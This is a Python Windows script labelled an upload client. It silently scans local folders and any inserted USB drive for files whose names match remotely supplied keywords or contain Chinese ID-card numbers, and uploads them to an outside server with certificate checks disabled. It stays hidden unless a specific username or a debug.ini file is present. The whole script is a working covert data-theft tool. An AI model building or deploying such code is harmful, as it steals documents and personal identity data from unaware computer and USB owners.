#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WeekTest 上传客户端 - 多线程 + U盘检测 + 最新文件优先上传版"""

import os
import json
import hashlib
import requests
import socket
import pathlib
import threading
import queue
import time
import urllib3
import tkinter as tk
from tkinter import scrolledtext
from datetime import datetime
import re
import base64
import ctypes
import win32api
import win32file
import win32con
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------- 配置 ----------------
API_BASE = "https://weektest.meiko.cyou"
RULES_URL = f"{API_BASE}/rules.json"
CHECK_URL = f"{API_BASE}/check_exists.php"
UPLOAD_URL = f"{API_BASE}/upload.php"
MAX_UPLOAD_THREADS = 4  # 并发上传线程数
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
USB_CHECK_INTERVAL = 5  # U盘检测间隔(秒)
# -------------------------------------

# ============ 时间过滤：仅 2024年8月1日之后 ============
CUTOFF_TIME = datetime(2024, 8, 1).timestamp()

# ============ 备注处理 ============
def get_uploader_note():
    beizhu_b64 = os.getenv("beizhu")
    if beizhu_b64:
        try:
            decoded = base64.b64decode(beizhu_b64).decode('utf-8')
            return decoded
        except Exception as e:
            log(f"[NOTE] Base64 解码失败（{e}），使用默认备注")
    return os.getenv("COMPUTERNAME") or os.getenv("USERNAME") or socket.gethostname()

UPLOADER_NOTE = get_uploader_note()
log_queue = queue.Queue()

# ============ 全局变量 ============
usb_scanned = set()  # 已扫描的U盘序列号
gui_mode = False
stop_usb_monitor = threading.Event()

# ============ 日志 ============
def log(msg: str):
    ts = datetime.now().strftime("%m-%d %H:%M:%S")
    txt = f"[{ts}] {msg}\n"
    print(txt, end="")
    log_queue.put(txt)

# ============ 网络 ============
def wait_for_network():
    while True:
        try:
            r = requests.head(API_BASE, timeout=5, verify=False)
            if r.status_code < 500:
                return
        except Exception:
            pass
        log("[NET] 网络未就绪，30s后重试...")
        time.sleep(30)

# ============ 规则 ============
def load_rules():
    cache = pathlib.Path(__file__).with_name("rules.json")
    wait_for_network()
    try:
        r = requests.get(RULES_URL, timeout=10, verify=False)
        if r.status_code == 200:
            rules = r.json()
            cache.write_text(r.text, encoding="utf-8")
            log("远程规则获取成功")
            return rules
        else:
            log(f"远程返回 {r.status_code}，尝试本地缓存")
    except Exception as e:
        log(f"远程失败 {e}，尝试本地缓存")
    if cache.exists():
        log("使用本地缓存 rules.json")
        return json.loads(cache.read_text(encoding="utf-8"))
    raise RuntimeError("既无远程也无本地缓存，无法加载规则")

# ============ MD5 ============
def calc_md5(file_path: str) -> str:
    h = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

# ============ 查重 ============
def exists_remote(md5: str) -> bool:
    wait_for_network()
    try:
        r = requests.post(CHECK_URL, data={"md5": md5}, timeout=10, verify=False)
        return r.json().get("exists", False)
    except Exception as e:
        log(f"查重异常：{e}")
        return False

# ============ 上传单个文件 ============
def upload_file(file_path: str, is_usb=False):
    """线程安全的单文件上传函数"""
    try:
        md5 = calc_md5(file_path)
        if exists_remote(md5):
            prefix = "[USB-SKIP]" if is_usb else "[SKIP]"
            log(f"{prefix} 已存在：{file_path}")
            return

        filename = os.path.basename(file_path)
        file_size = os.path.getsize(file_path) / 1024 / 1024
        prefix = "[USB-UPLOAD]" if is_usb else "[UPLOAD]"
        log(f"{prefix} 开始上传 {filename} ({file_size:.2f} MB)")

        with open(file_path, "rb") as f:
            files = {"file": (filename, f)}
            data = {"md5": md5, "note": UPLOADER_NOTE}
            wait_for_network()
            r = requests.post(UPLOAD_URL, files=files, data=data, timeout=300, verify=False)

        if r.status_code == 200 and "application/json" in r.headers.get("Content-Type", ""):
            try:
                result = r.json()
                log(f"{prefix} {filename} -> {result}")
            except ValueError:
                log(f"{prefix} {filename} 返回非JSON：{r.text[:200]}")
        else:
            log(f"{prefix} {filename} HTTP {r.status_code} {r.text[:200]}")

    except requests.exceptions.Timeout:
        prefix = "[USB-ERROR]" if is_usb else "[ERROR]"
        log(f"{prefix} 上传超时：{filename}")
    except Exception as e:
        prefix = "[USB-ERROR]" if is_usb else "[ERROR]"
        log(f"{prefix} 上传异常：{e}")

# ============ 身份证号检测 ============
IDC_PATTERN = re.compile(r'\d{17}[\dXx]')
def has_idc(name: str) -> bool:
    return bool(IDC_PATTERN.search(name))

# ============ 扫描目录 ============
def scan_directory(base_dir, rules, is_usb=False):
    """扫描指定目录并返回符合条件的文件列表"""
    kws = rules["keywords"]
    candidates = []
    
    if not os.path.isdir(base_dir):
        return []
        
    for root, _, files in os.walk(base_dir):
        for name in files:
            full = os.path.join(root, name)
            try:
                mtime = os.path.getmtime(full)
            except OSError:
                continue
            # 时间过滤：必须是 2024年8月1日之后
            if mtime < CUTOFF_TIME:
                continue
            # 内容过滤：关键词 or 身份证号
            if any(kw in name for kw in kws) or has_idc(name):
                candidates.append((mtime, full))
    
    return candidates

# ============ 扫描本地磁盘 ============
def scan_local_disks():
    """扫描本地磁盘"""
    rules = load_rules()
    dirs = [os.path.expandvars(d) for d in rules["search_dirs"]]
    candidates = []
    
    for base in dirs:
        candidates.extend(scan_directory(base, rules, is_usb=False))
    
    # 按修改时间倒序排序
    candidates.sort(key=lambda x: x[0], reverse=True)
    file_paths = [path for _, path in candidates]
    
    log(f"本地磁盘发现 {len(file_paths)} 个符合条件的文件待上传")
    
    if file_paths:
        with ThreadPoolExecutor(max_workers=MAX_UPLOAD_THREADS) as executor:
            futures = {executor.submit(upload_file, path, False): path for path in file_paths}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    path = futures[future]
                    log(f"[FATAL] 线程异常: {path} | {e}")
    
    log("本地磁盘扫描上传完成")

# ============ 扫描U盘 ============
def scan_usb_disk(drive_letter, usb_info=""):
    """扫描指定U盘"""
    # 检查是否存在debug.ini
    debug_path = os.path.join(drive_letter, "debug.ini")
    if os.path.exists(debug_path):
        log(f"[USB] U盘 {drive_letter} 存在 debug.ini，跳过扫描")
        return
    
    rules = load_rules()
    candidates = scan_directory(drive_letter, rules, is_usb=True)
    
    # 按修改时间倒序排序
    candidates.sort(key=lambda x: x[0], reverse=True)
    file_paths = [path for _, path in candidates]
    
    log(f"[USB] U盘 {drive_letter} 发现 {len(file_paths)} 个符合条件的文件待上传 {usb_info}")
    
    if file_paths:
        with ThreadPoolExecutor(max_workers=MAX_UPLOAD_THREADS) as executor:
            futures = {executor.submit(upload_file, path, True): path for path in file_paths}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    path = futures[future]
                    log(f"[USB-FATAL] 线程异常: {path} | {e}")
    
    log(f"[USB] U盘 {drive_letter} 扫描上传完成")

# ============ 获取U盘信息 ============
def get_usb_drives():
    """获取当前连接的USB驱动器"""
    drives = []
    drivebits = ctypes.windll.kernel32.GetLogicalDrives()
    
    for letter in range(ord('A'), ord('Z') + 1):
        drive_letter = chr(letter) + ":"
        if drivebits & (1 << (letter - ord('A'))):
            try:
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_letter + "\\")
                # DRIVE_REMOVABLE = 2, DRIVE_FIXED = 3
                if drive_type == 2:  # 可移动驱动器
                    # 获取卷序列号
                    volume_name_buffer = ctypes.create_unicode_buffer(1024)
                    file_system_name_buffer = ctypes.create_unicode_buffer(1024)
                    serial_number = ctypes.c_ulong()
                    
                    success = ctypes.windll.kernel32.GetVolumeInformationW(
                        drive_letter + "\\",
                        volume_name_buffer,
                        ctypes.sizeof(volume_name_buffer),
                        ctypes.byref(serial_number),
                        None,
                        None,
                        file_system_name_buffer,
                        ctypes.sizeof(file_system_name_buffer)
                    )
                    
                    if success:
                        volume_name = volume_name_buffer.value
                        file_system = file_system_name_buffer.value
                        serial = serial_number.value
                        
                        # 获取驱动器信息
                        free_bytes = ctypes.c_ulonglong(0)
                        total_bytes = ctypes.c_ulonglong(0)
                        
                        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                            drive_letter + "\\",
                            None,
                            ctypes.byref(total_bytes),
                            ctypes.byref(free_bytes)
                        )
                        
                        total_gb = total_bytes.value / (1024**3)
                        free_gb = free_bytes.value / (1024**3)
                        
                        drives.append({
                            'drive': drive_letter,
                            'serial': serial,
                            'volume_name': volume_name,
                            'file_system': file_system,
                            'total_gb': total_gb,
                            'free_gb': free_gb
                        })
            except Exception:
                continue
    
    return drives

# ============ U盘监控线程 ============
def usb_monitor():
    """监控U盘插入和移除"""
    log("[USB] U盘监控启动")
    
    while not stop_usb_monitor.is_set():
        try:
            current_usbs = get_usb_drives()
            current_serials = {usb['serial'] for usb in current_usbs}
            
            # 检测新插入的U盘
            for usb in current_usbs:
                serial = usb['serial']
                drive = usb['drive']
                
                if serial not in usb_scanned:
                    usb_info = f"({usb['volume_name']}, {usb['total_gb']:.1f}GB)"
                    log(f"[USB] 检测到新U盘: {drive} {usb_info}")
                    
                    # 标记为已扫描
                    usb_scanned.add(serial)
                    
                    # 检查是否启用调试模式
                    debug_path = os.path.join(drive, "debug.ini")
                    if os.path.exists(debug_path):
                        log(f"[USB] U盘 {drive} 存在 debug.ini，启用调试模式")
                        if not gui_mode:
                            # 在GUI模式下启动新窗口
                            log("[USB] 调试模式：显示操作界面")
                            # 这里可以添加显示调试界面的代码
                        continue
                    
                    # 扫描U盘
                    log(f"[USB] 开始扫描U盘: {drive}")
                    scan_usb_disk(drive, usb_info)
            
            # 检查已移除的U盘
            removed = usb_scanned - current_serials
            for serial in removed:
                usb_scanned.remove(serial)
                log(f"[USB] U盘已移除 (序列号: {serial})")
            
        except Exception as e:
            log(f"[USB-ERROR] 监控异常: {e}")
        
        # 等待下一次检查
        time.sleep(USB_CHECK_INTERVAL)
    
    log("[USB] U盘监控停止")

# ============ GUI 构建 ============
def build_gui() -> tk.Tk:
    root = tk.Tk()
    root.title("WeekTest Uploader - USB监控版")
    root.geometry("900x600")
    
    # 创建框架
    main_frame = tk.Frame(root)
    main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    # 状态栏
    status_frame = tk.Frame(main_frame)
    status_frame.pack(fill=tk.X, pady=(0, 10))
    
    tk.Label(status_frame, text="状态:", font=("Arial", 10, "bold")).pack(side=tk.LEFT)
    status_label = tk.Label(status_frame, text="运行中", fg="green", font=("Arial", 10, "bold"))
    status_label.pack(side=tk.LEFT, padx=(5, 0))
    
    tk.Label(status_frame, text="| 备注:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(20, 0))
    note_label = tk.Label(status_frame, text=UPLOADER_NOTE, fg="blue", font=("Arial", 10))
    note_label.pack(side=tk.LEFT, padx=(5, 0))
    
    # 控制按钮
    button_frame = tk.Frame(main_frame)
    button_frame.pack(fill=tk.X, pady=(0, 10))
    
    def on_rescan():
        log("[手动] 重新扫描本地磁盘...")
        threading.Thread(target=scan_local_disks, daemon=True).start()
    
    def on_check_usb():
        log("[手动] 检查U盘...")
        current_usbs = get_usb_drives()
        if current_usbs:
            for usb in current_usbs:
                log(f"[手动] 发现U盘: {usb['drive']} ({usb['volume_name']}, {usb['total_gb']:.1f}GB)")
        else:
            log("[手动] 未检测到U盘")
    
    rescan_btn = tk.Button(button_frame, text="重新扫描本地", command=on_rescan)
    rescan_btn.pack(side=tk.LEFT, padx=(0, 10))
    
    check_usb_btn = tk.Button(button_frame, text="检查U盘", command=on_check_usb)
    check_usb_btn.pack(side=tk.LEFT)
    
    # 日志窗口
    log_frame = tk.LabelFrame(main_frame, text="运行日志", padx=10, pady=10)
    log_frame.pack(fill=tk.BOTH, expand=True)
    
    log_widget = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, font=("Consolas", 9))
    log_widget.pack(fill=tk.BOTH, expand=True)
    
    # 日志轮询
    def poll_log():
        while True:
            try:
                line = log_queue.get_nowait()
                log_widget.insert(tk.END, line)
                log_widget.see(tk.END)
            except queue.Empty:
                break
        root.after(200, poll_log)
    
    # 窗口关闭处理
    def on_closing():
        stop_usb_monitor.set()
        log("[GUI] 正在关闭...")
        time.sleep(1)
        root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.after(200, poll_log)
    return root

# ============ 启动逻辑 ============
if __name__ == "__main__":
    def should_show_gui() -> bool:
        # 检查用户名
        if os.getenv("USERNAME", "").upper() == "SEEWO":
            return True
        
        # 检查本地磁盘的debug.ini
        try:
            for drv in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                if ctypes.windll.kernel32.GetDriveTypeW(drv + ":\\") == 3:  # 固定磁盘
                    if pathlib.Path(drv + ":\\debug.ini").is_file():
                        return True
        except Exception:
            pass
        
        # 检查已连接U盘的debug.ini
        try:
            usbs = get_usb_drives()
            for usb in usbs:
                drive = usb['drive']
                if pathlib.Path(drive + "\\debug.ini").is_file():
                    log(f"[启动] U盘 {drive} 存在 debug.ini，启用GUI模式")
                    return True
        except Exception:
            pass
        
        return False
    
    # 启动U盘监控线程
    usb_monitor_thread = threading.Thread(target=usb_monitor, daemon=True)
    
    if should_show_gui():
        gui_mode = True
        root = build_gui()
        log("GUI 模式启动")
        log(f"本机备注：{UPLOADER_NOTE}")
        
        # 启动本地扫描和U盘监控
        threading.Thread(target=scan_local_disks, daemon=True).start()
        usb_monitor_thread.start()
        
        root.mainloop()
        stop_usb_monitor.set()  # 停止U盘监控
    else:
        log("静默模式启动")
        log(f"本机备注：{UPLOADER_NOTE}")
        
        # 扫描本地磁盘
        scan_local_disks()
        
        # 检查当前已连接的U盘
        log("检查已连接的U盘...")
        current_usbs = get_usb_drives()
        if current_usbs:
            for usb in current_usbs:
                drive = usb['drive']
                usb_info = f"({usb['volume_name']}, {usb['total_gb']:.1f}GB)"
                
                # 检查是否存在debug.ini
                debug_path = os.path.join(drive, "debug.ini")
                if os.path.exists(debug_path):
                    log(f"[USB] U盘 {drive} 存在 debug.ini，跳过扫描")
                    continue
                
                log(f"[USB] 扫描已连接的U盘: {drive} {usb_info}")
                scan_usb_disk(drive, usb_info)
        else:
            log("未检测到U盘")
        
        log("程序执行完成")